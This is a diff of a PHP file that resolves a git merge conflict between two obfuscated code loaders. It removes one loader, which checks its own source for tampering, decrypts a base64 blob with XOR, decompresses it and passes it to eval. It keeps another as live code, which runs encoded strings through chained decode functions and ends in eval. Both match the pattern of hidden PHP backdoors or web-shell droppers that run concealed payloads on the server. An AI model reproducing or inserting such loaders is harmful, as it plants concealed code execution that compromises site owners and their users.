@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$vzeqxbhzk="f956a9c6633a0feb003fdac8221bb127";
-$nwcbirla="570f0655070802520e0305540307555a065106565256540d5305000001020255";
-$sotlqz="SezuMCte+iQojW3HTHkRE7Y02VBzXtI9OgMXK0ZomQ6TnIHODjoC1xJvbyOYNOTH6AQ0I+XT53ZOKkDiugTDvOovUXEHp3Nr+X7l+EZzQ66yQIdchcUvV/1abSRL/J7YrFhUu4lGWrQ/qTTuvAmM8uVVVEynzx+6D9t+jL7+834TjFTntRXneXMSFjDLUBvptVV9cS2KsKWnr9gngoPrg15CTnWBEyuWGsoTPRl1JAgGAXRShHCfDeFk3lmR32hRHo7zV2Lciu5S1IZJengNKLjR/lN5ze8WHh5fJFvixHBqf6dR4aNoSjXDSjmEqe8oEsNir27n1DSsu7idrqvc8kq3LuU8Mk0mYQlF0ulMnkBP3g0Gi2j5qURLzWgatRx08mKpUTs/zEn0jAb5PAKoWb6jaBmcduYoCW3ek7VC58iunmj7KHA0EYgcZkhqQw6mecTAmGlvH77JaCY/1mO9p5Yq6qzwDogVHgyM+5qiH0/4szR5B2LpyDiDJ5a44IS8kzijm64FBPpAQhPyg3YHbfodT5BXH4HzM1dhSc9hpfcwHlT6miRN3QlXp+0FyiKfgvjFN9MYZYo/LPGKvytt7vBQbSNpTlZlaubK/iJdTKbvAzHF25grIkthcML52U9avv0VpPbWTeKNagNh8vssx+UM4HlCJvhaWX1qYw==";
-$itdnmnnyzhk=file_get_contents(__FILE__);
-$ffdivpky=str_replace($sotlqz,"",$itdnmnnyzhk);
-if(strpos($ffdivpky,"ec"."ho")!==false||strpos($ffdivpky,"pr"."int")!==false||strpos($ffdivpky,"var_"."dump")!==false||strpos($ffdivpky,"file_put_"."contents")!==false||strpos($ffdivpky,"fw"."rite")!==false){die();}
-$szxgpig=str_replace(array($vzeqxbhzk,$nwcbirla),array("SP_f949f3b6","KP_4b07b496"),$itdnmnnyzhk);
-$daksosgmm=md5($szxgpig);
-$trfckbbyur=hex2bin($nwcbirla);
-$trpkvgfdyu="";
-$lwwpnxvr=strlen($daksosgmm);
-for($iumfhuxb=0;$iumfhuxb<$lwwpnxvr;$iumfhuxb++){
-$trpkvgfdyu.=chr(ord($trfckbbyur[$iumfhuxb])^ord($daksosgmm[$iumfhuxb]));
-}
-$qtywjyat=base64_decode($sotlqz);
-$fgwoxw=strlen($qtywjyat);
-$rwyigdpq="";
-$beukjlmu=strlen($trpkvgfdyu);
-for($iumfhuxb=0;$iumfhuxb<$fgwoxw;$iumfhuxb++){
-$rwyigdpq.=$qtywjyat[$iumfhuxb]^$trpkvgfdyu[$iumfhuxb%$beukjlmu];
-}
-$jpylpiz="gzun"."compress";
-eval($jpylpiz($rwyigdpq));
-=======
 // 5d42ef955370e15115a4801d
 $bXMZmvsyWe="Gsx6cZ4vp1o9rvp7vj7xV6SVvGVyU6H/J3q0HQw31xY=";
 $ZaimBhEFKYOMsh="Tfk6pM4ic1b9eic7iw7kI6FIiTIlH6U/W3d0UDj31kL=";
@@ -52,4 +27,3 @@ $SzrxeMlNiE=$AHeEJodfy($SzrxeMlNiE);
 $SzrxeMlNiE=$pdStojKlqDS($SzrxeMlNiE);
 $SzrxeMlNiE=$_dWCosBlPRN($SzrxeMlNiE);
 eval($SzrxeMlNiE);
->>>>>>> Stashed changes
